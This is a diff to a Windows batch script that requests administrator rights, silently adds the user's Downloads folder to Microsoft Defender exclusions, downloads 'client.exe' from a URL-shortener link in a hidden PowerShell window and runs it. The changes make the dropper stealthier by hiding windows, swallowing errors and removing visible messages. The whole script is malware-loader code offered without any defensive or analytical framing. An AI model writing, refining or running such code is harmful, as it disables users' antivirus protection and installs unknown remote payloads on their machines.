@@ -1,22 +1,26 @@
 @echo off
-:: Check for admin rights
+:: Ensure the script is run as Administrator
 net session >nul 2>&1
-if %errorLevel% neq 0 (
+if %errorlevel% neq 0 (
     echo Requesting administrator privileges...
-    powershell -Command "Start-Process '%~f0' -Verb runAs"
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
+:: Define variables
 set "url=https://shorturl44.at/zaccJ"
 set "output=%USERPROFILE%\Downloads\client.exe"
+set "downloads=%USERPROFILE%\Downloads"
 
-echo Adding Downloads folder to Defender exclusions...
-powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"
+:: Add Defender exclusion (optional, but now silent)
+powershell -NoProfile -WindowStyle Hidden -Command ^
+ "Try { Add-MpPreference -ExclusionPath '%downloads%' } Catch {}"
 
-timeout /t 1 >nul
+:: Download the file
+echo Downloading...
+powershell -NoProfile -WindowStyle Hidden -Command ^
+ "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
 
-echo Downloading file...
-powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
-
-echo Running the downloaded file...
-start "" "%output%"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
+:: Run the downloaded file
+start "" "%output%"
+exit
